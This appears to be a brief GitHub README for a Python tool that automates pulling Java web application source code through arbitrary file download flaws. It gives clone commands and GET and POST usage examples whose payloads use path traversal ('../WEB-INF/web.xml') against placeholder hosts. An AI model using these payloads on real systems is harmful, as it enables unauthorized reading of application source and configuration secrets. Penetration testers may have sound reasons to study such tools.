# Java_xmlhack
帮助java环境下任意文件下载情况自动化读取源码的小工具

## 使用
```bash
git clone https://github.com/Artemis1029/Java_xmlhack.git
cd Java_xmlhack
# if get
python xmlsearch.py -u https://xxx.xxx/?file=../WEB-INF/web.xml -c="cookie"
# if post
python xmlsearch.py -u https://xxx.xxx/ -d="file=../WEB-INF/web.xml" -t="content-type(default application/x-www-form-urlencoded)" -c="cookie"
```
